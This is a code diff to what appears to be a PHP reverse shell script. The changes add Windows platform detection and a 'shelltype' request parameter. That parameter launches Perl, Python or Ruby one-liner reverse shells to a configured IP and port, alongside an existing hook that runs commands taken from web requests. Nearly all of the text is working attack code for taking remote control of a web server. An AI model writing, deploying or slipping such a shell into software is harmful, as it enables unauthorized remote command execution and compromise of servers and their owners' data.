@@ -55,19 +55,26 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 set_time_limit (0);
-$VERSION = "2.0-smart";
+$VERSION = "2.1-smart";
 $ip = '127.0.0.1';  // DEFAULT
 $port = 1234;       // DEFAULT
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 $verbose = true;
 
 // DONT EDIT FROM THIS POINT ON
 // SPLIT&ENCRYPTme
+
+// Check Platform
+$os = 'linux';
+$shell = 'uname -a; w; id; /bin/sh -i';
+if (stripos(PHP_OS, 'WIN') === 0) {
+	//$shell = 'whoami & systeminfo | findstr /B /C:"OS Name" /C:"OS Version" & cmd.exe';
+	$shell = 'whoami & cmd.exe';
+}
 
 // Just run command
 if (isset($_REQUEST['c'])) {
@@ -88,7 +95,22 @@ if (isset($argv)) {
 	if (isset($argv[2])) $port = $argv[2];
 }
 
-
+// Other shells
+if (isset($_REQUEST['shelltype'])) {
+	if ($_REQUEST['shelltype'] === 'perl') {
+		die(shell_exec('perl -e \'use Socket;$i="' . $ip . '";$p=' . $port . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("' . $shell . '");};\''));
+	}
+	if ($_REQUEST['shelltype'] === 'python') {
+		if ($os == 'linux') $shell = '"/bin/sh", "-i"';
+		else $shell = '"cmd.exe"';
+		die(shell_exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $ip . '",' . $port . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([' . $shell . ']);\''));
+	}
+	if ($_REQUEST['shelltype'] === 'ruby') {
+		if ($os == 'linux') $shell = '/bin/sh -i <&%d >&%d 2>&%d';
+		else $shell = 'cmd.exe';
+		die(shell_exec('ruby -rsocket -e\'f=TCPSocket.open("' . $ip . '",' . $port . ').to_i;exec sprintf("' . $shell . '",f,f,f)\''));
+	}
+}
 
 //
 // Daemonise ourself if possible to avoid zombies later
